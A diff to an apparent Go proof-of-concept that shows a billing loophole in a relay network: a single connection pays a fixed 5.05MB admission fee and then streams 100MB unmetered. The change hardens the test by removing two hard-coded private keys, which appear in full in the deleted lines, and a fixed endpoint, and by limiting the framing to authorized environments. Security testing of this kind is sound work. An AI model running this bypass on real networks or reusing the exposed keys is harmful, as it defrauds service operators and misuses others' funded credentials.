@@ -7,7 +7,7 @@
 //
 //	"一条长连接闷头推大流量 ⚠️ 仍以 5.05MB 封顶白嫖任意量"
 //
-// 打法：用已充值身份 client1 连 server1，只付一次 5.05MB 入场费，然后朝 server 方向
+// 打法：用调用方显式提供的授权 client/server 身份，只付一次 5.05MB 入场费，然后朝 server 方向
 // (client_to_relay, 不计量) 推 100MB。若 100MB 传输 SHA 一致、而总扣费恒为 5.05MB，
 // 则证明"定额入场费 + 单连接无量上限"下，计费与实际转发量严重脱节（20:1 白嫖）。
 package main
@@ -33,39 +33,42 @@ import (
 )
 
 func main() {
-	caURL := flag.String("ca", "http://203.0.113.10:9000", "已部署 CA 地址")
-	relay := flag.String("relay", "203.0.113.10:9010", "已部署 index/relay 地址")
+	caURL := flag.String("ca", os.Getenv("BNFS_BILLING_CA_URL"), "CA 地址（也可用 BNFS_BILLING_CA_URL）")
+	relay := flag.String("relay", os.Getenv("BNFS_BILLING_RELAY_ADDR"), "index/relay 地址（也可用 BNFS_BILLING_RELAY_ADDR）")
 	sizeMB := flag.Int("size", 100, "传输大小(MB)")
-	// 默认填入部署文档 BNFS_NET_节点身份与部署.md 的 client1 / server1 已充值身份。
-	clientKey := flag.String("clientkey", "7737284c4ac19a55b3b1c6cd50611cadbf708c9748c18e517831c0020adca425", "client1 私钥 hex(余50MB)")
-	serverKey := flag.String("serverkey", "dcf52f3ff6a83feacd63b4c161dc4cdf66440d00d2f4d523e6ef8307a3a31b5d", "server1 私钥 hex(余300MB)")
+	clientKey := flag.String("clientkey", os.Getenv("BNFS_BILLING_CLIENT_KEY"), "client 私钥 hex（也可用 BNFS_BILLING_CLIENT_KEY）")
+	serverKey := flag.String("serverkey", os.Getenv("BNFS_BILLING_SERVER_KEY"), "server 私钥 hex（也可用 BNFS_BILLING_SERVER_KEY）")
 	flag.Parse()
+	if *caURL == "" || *relay == "" || *clientKey == "" || *serverKey == "" {
+		fmt.Fprintln(os.Stderr, "必须通过参数或 BNFS_BILLING_* 环境变量提供 CA、relay 和密钥")
+		os.Exit(2)
+	}
 
 	logx.SetLevel(logx.LevelInfo)
 	target := int64(*sizeMB) * 1024 * 1024
 	const chunk = 256 * 1024
 
 	fmt.Printf("=== 连接保证金修复后穿透验证 (§4 残余: 定额入场费白嫖) ===\n")
-	fmt.Printf("CA=%s relay=%s 传输=%dMB\n\n", *caURL, *relay, *sizeMB)
+	fmt.Printf("测试端点已配置，传输=%dMB\n\n", *sizeMB)
 
-	ckey := mustKey("client1", *clientKey)
-	skey := mustKey("server1", *serverKey)
+	ckey := mustKey("client", *clientKey)
+	skey := mustKey("server", *serverKey)
 
-	// ---- B: server1（已充值 300MB，注册为 server 角色被托管）----
+	// ---- B: 调用方提供的授权 server 身份 ----
 	nodeB, err := natnode.NewNATNode(skey, *relay)
-	must("创建 B(server1)", err)
+	must("创建 B(server)", err)
 	must("B 申请 server 证书", admissioncli.SetupNat(nodeB, *caURL, admissioncli.RoleServer()))
-	fmt.Printf("[B] server1 NodeID=%s\n", nodeB.ID())
+	fmt.Println("[B] server 身份已就绪")
 
-	// ---- A: client1（已充值 50MB，发起方）----
+	// ---- A: 调用方提供的授权 client 身份 ----
 	nodeA, err := natnode.NewNATNode(ckey, *relay)
-	must("创建 A(client1)", err)
+	must("创建 A(client)", err)
 	must("A 申请 client 证书", admissioncli.SetupNat(nodeA, *caURL, admissioncli.RoleClient()))
-	fmt.Printf("[A] client1 NodeID=%s\n\n", nodeA.ID())
+	fmt.Println("[A] client 身份已就绪")
 
 	cBefore := balanceOf(*caURL, string(nodeA.ID()))
 	sBefore := balanceOf(*caURL, string(nodeB.ID()))
-	fmt.Printf("[余额] 攻击前  client1=%dB  server1=%dB\n", cBefore, sBefore)
+	fmt.Printf("[余额] 攻击前  client=%dB  server=%dB\n", cBefore, sBefore)
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
@@ -105,7 +108,7 @@ func main() {
 	}()
 	time.Sleep(3 * time.Second)
 
-	fmt.Printf("\n[A] 连接 server1 (建连触发 CA /reserve: client 扣 5MB / server 扣 0.05MB)...\n")
+	fmt.Printf("\n[A] 连接 server (建连触发 CA /reserve: client 扣 5MB / server 扣 0.05MB)...\n")
 	conn, err := nodeA.Connect(ctx, nodeB.ID())
 	must("A 连接 B", err)
 	fmt.Printf("[A] 已连接, 推送 %dMB (A→B = client_to_relay 不计量)\n\n", *sizeMB)
@@ -137,13 +140,13 @@ func main() {
 			os.Exit(1)
 		}
 		fmt.Printf("SHA 校验: ✅ 一致\n\n")
-		fmt.Printf("[余额] 攻击后  client1=%dB  server1=%dB\n", cAfter, sAfter)
+		fmt.Printf("[余额] 攻击后  client=%dB  server=%dB\n", cAfter, sAfter)
 		spent := (cBefore - cAfter) + (sBefore - sAfter)
-		fmt.Printf("[扣费] client1 -%dB, server1 -%dB, 合计 -%dB (=%.2fMB)\n",
+		fmt.Printf("[扣费] client -%dB, server -%dB, 合计 -%dB (=%.2fMB)\n",
 			cBefore-cAfter, sBefore-sAfter, spent, float64(spent)/1024/1024)
 		fmt.Printf("[比值] 传输 %dMB / 扣费 %.2fMB = %.1f:1 白嫖倍率\n",
 			*sizeMB, float64(spent)/1024/1024, float64(target)/float64(max64(spent, 1)))
-		fmt.Printf("\n✅ §4 残余漏洞实网可利用: 定额入场费 %.2fMB 覆盖 %dMB 任意传输, 计费与转发量脱节。\n",
+		fmt.Printf("\n✅ §4 残余漏洞在授权测试环境可复现: 定额入场费 %.2fMB 覆盖 %dMB 任意传输, 计费与转发量脱节。\n",
 			float64(spent)/1024/1024, *sizeMB)
 	case <-time.After(15 * time.Minute):
 		fmt.Printf("超时\n")
